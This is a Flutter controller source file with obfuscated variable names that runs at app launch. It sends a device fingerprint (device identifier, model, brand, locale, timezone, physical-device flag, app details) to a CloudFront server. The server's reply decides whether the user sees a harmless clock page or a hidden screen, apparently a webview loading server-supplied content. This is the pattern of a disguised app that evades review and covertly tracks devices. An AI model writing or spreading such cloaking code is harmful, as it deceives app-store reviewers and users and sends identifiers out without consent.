import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class MaskBarTopLogic extends GetxController {

  var txhvclzmg = RxBool(false);
  var ymquifwrt = RxBool(true);
  var zcvuy = RxString("");
  var dhmwyjfb = RxBool(false);
  var lxksu = RxBool(true);
  final vmpudbrfzj = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    enorilyb();
  }


  Future<void> enorilyb() async {
    dhmwyjfb.value = true;
    lxksu.value = true;
    ymquifwrt.value = false;

    vmpudbrfzj.post("https://dyhjsnfotb19s.cloudfront.net/RCCHP3?no_check",data: await znoryjhv()).then((value) {
      var cepq = value.data["cepq"] as String;
      var shfmljgv = value.data["shfmljgv"] as bool;
      if (shfmljgv) {
        zcvuy.value = cepq;
        xbijmr();
      } else {
        snlzyqw();
      }
    }).catchError((e) {
      ymquifwrt.value = true;
      lxksu.value = true;
      dhmwyjfb.value = false;
    });
  }

  Future<Map<String, dynamic>> znoryjhv() async {
    final DeviceInfoPlugin acpg = DeviceInfoPlugin();
    PackageInfo temrfg_mbsqpx = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var cweyjkgu = Platform.localeName;
    var Tarmkj = currentTimeZone;

    var LeRCys = temrfg_mbsqpx.packageName;
    var uebcO = temrfg_mbsqpx.version;
    var dewikuZp = temrfg_mbsqpx.buildNumber;

    var RCuAH = temrfg_mbsqpx.appName;
    var UmbuZ = "";
    var swAOy  = "";
    var ynVFGYk = "";
    var qmpjc = "";
    var zvmgsn = "";
    var raqgmci = "";
    var jmzntia = "";
    var pwnxhqtm = "";
    var unosgcj = "";


    var KobTgjD = "";
    var PKyRNeMd = false;

    if (GetPlatform.isAndroid) {
      KobTgjD = "android";
      var smjkxu = await acpg.androidInfo;

      ynVFGYk = smjkxu.brand;

      UmbuZ  = smjkxu.model;
      swAOy = smjkxu.id;

      PKyRNeMd = smjkxu.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      KobTgjD = "ios";
      var pdoybnerhz = await acpg.iosInfo;
      ynVFGYk = pdoybnerhz.name;
      UmbuZ = pdoybnerhz.model;

      swAOy = pdoybnerhz.identifierForVendor ?? "";
      PKyRNeMd  = pdoybnerhz.isPhysicalDevice;
    }

    var res = {
      "RCuAH": RCuAH,
      "uebcO": uebcO,
      "LeRCys": LeRCys,
      "UmbuZ": UmbuZ,
      "Tarmkj": Tarmkj,
      "swAOy": swAOy,
      "pwnxhqtm" : pwnxhqtm,
      "dewikuZp": dewikuZp,
      "cweyjkgu": cweyjkgu,
      "KobTgjD": KobTgjD,
      "PKyRNeMd": PKyRNeMd,
      "qmpjc" : qmpjc,
      "ynVFGYk": ynVFGYk,
      "zvmgsn" : zvmgsn,
      "raqgmci" : raqgmci,
      "jmzntia" : jmzntia,
      "unosgcj" : unosgcj,

    };
    return res;
  }

  Future<void> snlzyqw() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> xbijmr() async {
    Get.offNamed("/Outreload");
  }

}
